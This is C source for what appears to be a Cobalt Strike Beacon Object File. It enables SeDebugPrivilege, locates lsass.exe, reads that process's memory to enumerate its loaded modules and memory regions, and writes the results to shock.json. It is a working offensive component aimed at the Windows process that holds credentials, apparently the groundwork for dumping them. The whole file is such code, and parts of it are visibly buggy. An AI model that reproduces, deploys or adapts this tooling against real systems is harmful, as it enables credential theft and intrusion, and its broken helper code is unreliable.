#include <windows.h>
#include "beacon.h"

#define MAX_PATH 260
#define MAX_MODULES 1024
#define MAX_NAME_LENGTH 256
#define JSON_BUFFER_SIZE 5096

typedef struct {
    char base_dll_name[MAX_PATH];   // Base DLL name
    char full_dll_path[MAX_PATH];   // Full DLL path
    void* dll_base;                 // DLL base address
    int size;
} ModuleInformation;

// Define the NTSTATUS function signatures
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtOpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtAdjustPrivilegesToken(HANDLE, BOOLEAN, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtClose(HANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryInformationProcess(HANDLE, ULONG, PVOID, ULONG, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtDelayExecution(BOOLEAN, PLARGE_INTEGER);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtReadVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtGetNextProcess(HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryVirtualMemory( HANDLE, PVOID, LPVOID, PVOID, SIZE_T, PSIZE_T);

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(VOID);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT int    WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH,LPBOOL);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);

const int zero_memory = 0x00000008;
const int max_string_length = 1024;

// Structure for TOKEN_PRIVILEGES
typedef struct _TOKEN_PRIVILEGES_STRUCT {
    DWORD PrivilegeCount;
    LUID Luid;
    DWORD Attributes;
} TOKEN_PRIVILEGES_STRUCT;


typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;            // This is reserved for internal use
    PVOID PebBaseAddress;       // Base address of the process's PEB (Process Environment Block)
    PVOID Reserved2[2];         // Reserved for internal use
    ULONG_PTR UniqueProcessId;  // The process ID
    PVOID Reserved3;            // Reserved for internal use
} PROCESS_BASIC_INFORMATION;


PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID buff = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 8);
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NTDLL$NtReadVirtualMemory(hProcess, mem_address, buff, 8, &bytesRead);
    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "Error \n");
    }
    long long value = *(long long*)buff;
    // BeaconPrintf(CALLBACK_OUTPUT, "buff: 0x%p \n", buff);
    //KERNEL32$HeapAlloc(hHeap, 0, buff);
    return (PVOID)value;
}


char* ConvertUnicodeToAnsi(HANDLE hHeap, WCHAR* unicodeStr) {
    // Determine the size of the buffer required for the ANSI string
    int bufferSize = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, unicodeStr, -1, NULL, 0, NULL, NULL);
    
    if (bufferSize == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to calculate ANSI string size.\n");
        return NULL;
    }

    // Allocate memory for the ANSI string
    char* ansiStr = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, bufferSize);
    if (ansiStr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for ANSI string.\n");
        return NULL;
    }

    // Convert the Unicode string to ANSI
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, unicodeStr, -1, ansiStr, bufferSize, NULL, NULL);

    return ansiStr;    
}


char* ReadRemoteWStr(HANDLE hProcess, PVOID mem_address) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID buff = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 256);
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NTDLL$NtReadVirtualMemory(hProcess, mem_address, buff, 256, &bytesRead);
    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading remote memory. NTSTATUS: 0x%X\n", ntstatus);
        KERNEL32$HeapFree(hHeap, 0, buff);  // Clean up
        // return;
    }
    // Cast the buffer to a Unicode (WCHAR*) string
    WCHAR* unicodeStr = (WCHAR*)buff;

    char* ansiStr = ConvertUnicodeToAnsi(hHeap, unicodeStr);
    if (ansiStr == NULL) {
        KERNEL32$HeapFree(hHeap, 0, buff);  // Clean up
        return;
    }

    // Clean up: Free the allocated buffer
    KERNEL32$HeapFree(hHeap, 0, buff);

    return ansiStr;
}


void EnableDebugPrivileges() {
    HANDLE currentProcess = KERNEL32$GetCurrentProcess();
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] Current process handle:\t%d\n", currentProcess);

    HANDLE tokenHandle = NULL;

    // Open the process token
    NTSTATUS ntstatus = NTDLL$NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &tokenHandle);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtOpenProcessToken. NTSTATUS: 0x%08X\n", ntstatus);
        return;
    }
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] NTSTATUS: %d\n", ntstatus);

    // Set the privilege
    TOKEN_PRIVILEGES_STRUCT tokenPrivileges;
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Luid.LowPart = 20;  // SeDebugPrivilege LUID LowPart
    tokenPrivileges.Luid.HighPart = 0;
    tokenPrivileges.Attributes = SE_PRIVILEGE_ENABLED;

    ntstatus = NTDLL$NtAdjustPrivilegesToken(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES_STRUCT), NULL, NULL);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x%08X\n", ntstatus);
        NTDLL$NtClose(tokenHandle);
        return;
    }
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] NTSTATUS: %d\n", ntstatus);

    // Close the handle
    if (tokenHandle != NULL) {
        NTDLL$NtClose(tokenHandle);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Debug privileges enabled successfully.\n");
}


char* GetProcNameFromHandle(HANDLE process_handle) {
    const int peb_offset = 0x8;
    const int commandline_offset = 0x68;
    const int processparameters_offset = 0x20;
    const ULONG ProcessBasicInformation = 0;
    

    const int process_basic_information_size = 48;
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID pbi_addr = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, process_basic_information_size);
    if (pbi_addr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for process information.\n");
        return "";
    }
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] PBI Addr: 0x%p.\n", pbi_addr);
    
    ULONG returnLength = 0;

    NTSTATUS ntstatus = NTDLL$NtQueryInformationProcess(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, &returnLength);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return;
    }
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] NTSTATUS: %d\n", ntstatus);

    PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
    // TO ADD: KERNEL32$HeapFree(hHeap, 0, pbi_addr);
    PVOID pebaddress = *(PVOID*)peb_pointer;
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] PEB Address: 0x%p\n", pebaddress);

    // Get PEB->ProcessParameters
    PVOID processparameters_pointer = (PVOID)((BYTE*)pebaddress + processparameters_offset);
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] processparameters_pointer: 0x%p\n", processparameters_pointer);

    PVOID processparameters_address = ReadRemoteIntPtr(process_handle, processparameters_pointer);
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] processparameters_address: 0x%p\n", processparameters_address);
    
    PVOID commandline_pointer = (PVOID)((BYTE*)processparameters_address + commandline_offset);
    PVOID commandline_address = ReadRemoteIntPtr(process_handle, commandline_pointer);
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] commandline_address: 0x%p\n", commandline_address);

    char* commandline_value = ReadRemoteWStr(process_handle, commandline_address);
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] commandline_value: %s\n", commandline_value);

    //BeaconPrintf(CALLBACK_OUTPUT, "[+] Function end.\n");
    return commandline_value;
}


HANDLE GetProcessByName(const char* proc_name) {
    HANDLE aux_handle = NULL;
    NTSTATUS status;

    // Iterate processes
    while ((status = NTDLL$NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, &aux_handle)) == 0) {
        char* current_proc_name = GetProcNameFromHandle(aux_handle);
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] Process: %s.\n", current_proc_name);
        
        if (current_proc_name && MyStrCmp(current_proc_name, proc_name) == 0) {
            return aux_handle;
        }
    }
    return NULL;
}


ModuleInformation* CustomGetModuleHandle(HANDLE process_handle, int* out_module_counter) {
    // Constant values for offsets
    int process_basic_information_size = 48;
    int peb_offset = 0x8;
    int ldr_offset = 0x18;
    int inInitializationOrderModuleList_offset = 0x30;
    int flink_dllbase_offset = 0x20;
    int flink_buffer_fulldllname_offset = 0x40;
    int flink_buffer_offset = 0x50;
    const ULONG ProcessBasicInformation = 0;

    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID pbi_addr = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, process_basic_information_size);
    if (pbi_addr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for process information.\n");
        return "";
    }
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] PBI Addr: \t0x%p.\n", pbi_addr);
    
    ULONG returnLength = 0;

    NTSTATUS ntstatus = NTDLL$NtQueryInformationProcess(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, &returnLength);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return;
    }
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] NTSTATUS: %d\n", ntstatus);

    PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
    // TO ADD: KERNEL32$HeapFree(hHeap, 0, pbi_addr);
    PVOID pebaddress = *(PVOID*)peb_pointer;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] PEB Address: \t\t0x%p\n", pebaddress);

    // Get PEB->Ldr
    void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] Ldr Pointer: \t0x%p\n", ldr_pointer);
    void* ldr_address = ReadRemoteIntPtr(process_handle, ldr_pointer);
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] Ldr Address: \t0x%p\n", ldr_address);

    // Traverse the InitializationOrderModuleList
    void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_address + inInitializationOrderModuleList_offset);
    void* next_flink = ReadRemoteIntPtr(process_handle, InInitializationOrderModuleList);
    //BeaconPrintf(CALLBACK_OUTPUT, "[+] Initial Next Flink: \t0x%p\n", next_flink);

    // Free memory
    KERNEL32$HeapFree(hHeap, 0, pbi_addr);

    // Create list
    int module_counter = 0;
    ModuleInformation* module_list = (ModuleInformation*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(ModuleInformation) * MAX_MODULES);

    if (!module_list) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory for module_list.");
        return;
    }

    void* dll_base = (void*)1337;
    while (dll_base != NULL) {
        // Adjust flink pointer
        next_flink = (void*)((uintptr_t)next_flink - 0x10);
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] next_flink: \t0x%p\n", next_flink);

        // DLL base address
        dll_base = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_dllbase_offset));
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] dll_base: \t\t0x%p\n", dll_base);

        // DLL name
        void* buffer = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_buffer_offset));
        char* base_dll_name = ReadRemoteWStr(process_handle, buffer);
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] Base DLL Name: \t%s\n", base_dll_name);
        
        // DLL full path
        void* full_dll_name_addr = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_buffer_fulldllname_offset));
        char* full_dll_path = ReadRemoteWStr(process_handle, full_dll_name_addr);
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] Full DLL Name: \t%s\n", full_dll_path);

        if(dll_base != 0){
            ModuleInformation module_info;
            module_info.dll_base = dll_base;
            module_info.size = 0;

            int i;
            for (i = 0; i < MAX_PATH - 1 && base_dll_name[i] != '\0'; i++) {
                module_info.base_dll_name[i] = base_dll_name[i];
            }
            module_info.base_dll_name[i] = '\0';

            int j;
            for (j = 0; j < MAX_PATH - 1 && full_dll_path[j] != '\0'; j++) {
                module_info.full_dll_path[j] = full_dll_path[j];
            }
            module_info.full_dll_path[j] = '\0';

            // Create new ModuleInformation
            module_list[module_counter] = module_info;
            module_counter++;
        }       
        // Move to the next flink
        next_flink = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + 0x10));
    }

    /*
    ModuleInformation* new_module_list = (ModuleInformation*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(ModuleInformation) * module_counter);
    for (int i = 0; i < module_counter; i++) {
        new_module_list[i] = module_list[i];
    }

    KERNEL32$HeapFree(hHeap, 0, module_list);
    */

    // Return the module list
    *out_module_counter = module_counter;
    return module_list;
}


void sleep(int seconds){
    LARGE_INTEGER delay;
    delay.QuadPart = -(seconds * 1000000000000); // this is probably wrong
    NTDLL$NtDelayExecution(FALSE, &delay);
}


ModuleInformation find_module_by_name(ModuleInformation* moduleInformationList, int module_counter, const char* aux_name) {
    for (int i = 0; i < module_counter; i++) {
        if (MyStrCmp(moduleInformationList[i].base_dll_name, aux_name) == 0) {
            return moduleInformationList[i];
        }
    }
    return moduleInformationList[0]; // Change to empty module
}


int find_index_by_name(ModuleInformation* moduleInformationList, int module_counter, const char* aux_name) {
    for (int i = 0; i < module_counter; i++) {
        if (MyStrCmp(moduleInformationList[i].base_dll_name, aux_name) == 0) {
            return i;
        }
    }
    return -1;
}


int MyStrCmp(const char* s1, const char* s2) {
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return *(unsigned char*)s1 - *(unsigned char*)s2;
}


void MyIntToHexStr(long long value, char* buffer) {
    int i;
    // We need exactly 12 hex digits for "7FFD572D0000"
    for (i = 11; i >= 0; i--) {
        int nibble = value & 0xF;  // Get the last 4 bits (1 nibble)
        
        // Convert the nibble to a hex character
        if (nibble < 10) {
            buffer[i] = '0' + nibble;
        } else {
            buffer[i] = 'A' + (nibble - 10);
        }

        value >>= 4;  // Shift right by 4 bits to process the next nibble
    }

    buffer[12] = '\0';  // Null-terminate the string
}


void MyIntToStr(int value, char* buffer) {
    char temp[12];  // Temporary buffer to store the digits
    int i = 0;
    int is_negative = 0;

    // Handle negative numbers
    if (value < 0) {
        is_negative = 1;
        value = -value;
    }

    // Extract digits and store in temp in reverse order
    do {
        temp[i++] = (value % 10) + '0';
        value /= 10;
    } while (value > 0);

    // Add minus sign for negative numbers
    if (is_negative) {
        temp[i++] = '-';
    }

    // Reverse the characters from temp into the final buffer
    int j = 0;
    while (i > 0) {
        buffer[j++] = temp[--i];
    }
    
    buffer[j] = '\0';  // Null-terminate the string
}


void MyStrcpy(char* dest, const char* src, size_t max_len) {
    size_t i = 0;
    while (i < max_len - 1 && src[i] != '\0') {
        dest[i] = src[i];
        i++;
    }
    dest[i] = '\0';
}


int MyStrLen(char *str) {
    int len = 0;
    while (str[len] != '\0') {
        len++;
    }
    return len;
}


char* concatenate_strings(char* str1, char* str2) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    if (hHeap == NULL) {
        return NULL; // Handle error
    }

    // Get the lengths of both strings
    size_t len1 = MyStrLen(str1);
    size_t len2 = MyStrLen(str2);

    // Allocate memory for the concatenated result (str1 + str2 + null terminator)
    size_t all_len = len1 + len2 + 1;
    /// if(all_len == 40){
    ///     BeaconPrintf(CALLBACK_OUTPUT, "%d\t%d\t%d\tstr1: %s...%s \n", len1, len2, all_len, str1, str2);
    /// }
    char* result = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, all_len);
    if (result == NULL) {
        return NULL; // Handle allocation failure
    }

    // Copy str1 into result (manual copy to avoid strcpy)
    for (size_t i = 0; i < len1; i++) {
        result[i] = str1[i];
    }

    // Copy str2 into result, starting where str1 ends
    for (size_t i = 0; i < len2; i++) {
        result[len1 + i] = str2[i];
    }
    // Null-terminate the concatenated string
    result[len1 + len2] = '\0';
    // KERNEL32$HeapFree(hHeap, 0, result);
    return result; // Return the concatenated string
}


char* create_string_with_var(char* f1, char* var1, char* f2) {
    // Calculate the total length of the final string
    size_t f1_len = MyStrLen(f1);
    size_t v1_len = MyStrLen(var1);
    size_t f2_len = MyStrLen(f2);
    
    // Allocate memory for the final string
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    if (hHeap == NULL) {
        return NULL;  // Handle error
    }
    size_t total_len = f1_len + v1_len + f2_len + 1;  // +1 for null terminator
    char* result = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 5096);    
    if (result == NULL) {
        return NULL;  // Handle allocation failure
    }

    size_t offset = 0;
    for (size_t i = 0; i < f1_len; i++) {
        result[offset++] = f1[i];
    }
    for (size_t i = 0; i < v1_len; i++) {
        result[offset++] = var1[i];
    }
    for (size_t i = 0; i < f2_len; i++) {
        result[offset++] = f2[i];
    }
    result[offset] = '\0';
    /*
    // printf("Size is: %d\n", offset);
    char* adj_result = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, offset+1);
    MyStrcpy(adj_result, result, offset+1);
    KERNEL32$HeapFree(hHeap, 0, result);

    return adj_result;
    */
    return result;
}


void replace_backslash(const char* str, char* result, int result_size){
    int i, j = 0;
    for (i = 0; str[i] != '\0'; i++) {
        if (j + 2 >= result_size) {
            BeaconPrintf(CALLBACK_ERROR, "Result buffer size is too small.");
            break;
        }
        if (str[i] == '\\') {
            result[j++] = '\\';
            result[j++] = '\\';
        } 
        else {
            if (j + 1 >= result_size) {
                BeaconPrintf(CALLBACK_ERROR, "Result buffer size is too small.");
                break;
            }
            result[j++] = str[i];
        }
    }
    result[j] = '\0';
}


char* get_json(ModuleInformation* module_list, int module_counter){
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    char *buffer = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 5096);
    if (buffer == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed\n");
        return;
    }

    char* json_output = "[";
    for (int i = 0; i < module_counter; i++) {
        if(i != 0){
            json_output = concatenate_strings(json_output, ", ");    
        }
        char* base_buffer[17];
        MyIntToHexStr((long long) module_list[i].dll_base, base_buffer);
        // BeaconPrintf(CALLBACK_OUTPUT, "%p\n", module_list[i].dll_base);
        // BeaconPrintf(CALLBACK_OUTPUT, "%s\n", base_buffer);

        char* size_buffer[12];
        MyIntToStr(module_list[i].size, size_buffer);
        char* full_dll_path_corrected[MAX_PATH];
        replace_backslash(module_list[i].full_dll_path, full_dll_path_corrected, MAX_PATH);
        // BeaconPrintf(CALLBACK_OUTPUT, "%s\n", full_dll_path_corrected);

        char* json_part_1 = create_string_with_var("{ \"field0\":\"", module_list[i].base_dll_name, "\",");
        char* json_part_2 = create_string_with_var("\"field1\":\"", full_dll_path_corrected, "\",");
        char* json_part_3 = create_string_with_var("\"field2\":\"0x", base_buffer, "\",");
        char* json_part_4 = create_string_with_var("\"field3\":\"", size_buffer, "\"}");
        /// BeaconPrintf(CALLBACK_OUTPUT, "%s\n", "333");
        char* json_part_a = concatenate_strings(json_part_1, json_part_2);
        /// BeaconPrintf(CALLBACK_OUTPUT, "%s\n", "555");
        char* json_part_b = concatenate_strings(json_part_3, json_part_4);
        char* json_entry = concatenate_strings(json_part_a, json_part_b);
        json_output = concatenate_strings(json_output, json_entry);
    }
    json_output = concatenate_strings(json_output, "]");
    // BeaconPrintf(CALLBACK_OUTPUT, "%s\n", json_output);
    // KERNEL32$HeapFree(hHeap, 0, buffer);
    return json_output;
}


void write_string_to_file(char* file_path, char* data) {
    // CreateFile
    HANDLE hFile = KERNEL32$CreateFileA(
        file_path,                // File path
        GENERIC_WRITE,            // Open for writing
        0,                        // Do not share
        NULL,                     // Default security
        CREATE_ALWAYS,            // Overwrite the file if it exists
        FILE_ATTRIBUTE_NORMAL,    // Normal file attributes
        NULL                      // No template file
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create file: %s\n", file_path);
        return;
    }

    // WriteFile
    int data_len = MyStrLen(data);
    DWORD bytesWritten;
    BOOL result = KERNEL32$WriteFile(
        hFile,                    // Handle to the file
        data,                     // Pointer to the data to write
        data_len,           // Length of the data (in bytes)
        &bytesWritten,            // Number of bytes written
        NULL                      // Overlapped not used
    );
    if (!result) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to write to file: %s\n", file_path);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] File %s generated (%d bytes).\n", file_path, bytesWritten);
    }

    // Close handle
    KERNEL32$CloseHandle(hFile);
}


void Shock(){
    char* filename = "shock.json";
    EnableDebugPrivileges();
    HANDLE currentProcess = KERNEL32$GetCurrentProcess();
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] Current process handle:\t%d\n", currentProcess);
    GetProcNameFromHandle(currentProcess);
    HANDLE hProcess = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Process handle: \t\t%d\n", hProcess);
    int module_counter = 0;
    ModuleInformation* module_list = CustomGetModuleHandle(hProcess, &module_counter);
    // print(module_list, module_counter);    
        
    long long proc_max_address_l = 0x7FFFFFFEFFFF;
    PVOID mem_address = 0;
    int aux_size = 0;
    char aux_name[MAX_PATH] = "";

    while ((long long)mem_address < proc_max_address_l) {
        MEMORY_BASIC_INFORMATION mbi;
        SIZE_T returnSize;

        int memory_basic_information_size = sizeof(MEMORY_BASIC_INFORMATION);
        HANDLE hHeap = KERNEL32$GetProcessHeap();
        PVOID mbi_addr = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, memory_basic_information_size);
        if (mbi_addr == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for process information.\n");
            return "";
        }
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] MBI Addr: 0x%p.\n", mbi_addr);


        // Populate MEMORY_BASIC_INFORMATION struct
        NTSTATUS ntstatus = NTDLL$NtQueryVirtualMemory(hProcess, mem_address, 0, &mbi, sizeof(mbi), &returnSize);

        // If readable and committed --> Get information
        if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT) {
            //BeaconPrintf(CALLBACK_OUTPUT, "[+] Mem Addr: 0x%p\tmbi.RegionSize: 0x%p\n", mem_address, mbi.RegionSize);
            
            // Find the module by name
            ModuleInformation aux_module = find_module_by_name(module_list, module_counter, aux_name);
            
            if (mbi.RegionSize == 0x1000 && mbi.BaseAddress != aux_module.dll_base) {
                aux_module.size = aux_size;
                // Find module index
                int aux_index = find_index_by_name(module_list, module_counter, aux_name);
                module_list[aux_index] = aux_module;

                for (int k = 0; k < module_counter; k++) {
                    if (mbi.BaseAddress == module_list[k].dll_base) {                        
                        //strcpy(aux_name, module_list[k].base_dll_name);
                        MyStrcpy(aux_name, module_list[k].base_dll_name, MAX_NAME_LENGTH);
                        aux_size = (int)mbi.RegionSize;
                    }
                }
            }
            else {
                aux_size += (int)mbi.RegionSize;
            }
        }
        mem_address = (PVOID)((ULONG_PTR)mem_address + mbi.RegionSize);
        KERNEL32$HeapFree(hHeap, 0, mbi_addr);
    }

    char* json_output = get_json(module_list, module_counter);
    // BeaconPrintf(CALLBACK_OUTPUT, "%s\n", json_output);
    write_string_to_file(filename, json_output);
    
    // Close handle
    NTDLL$NtClose(hProcess);
}


void go() {
    Shock();
}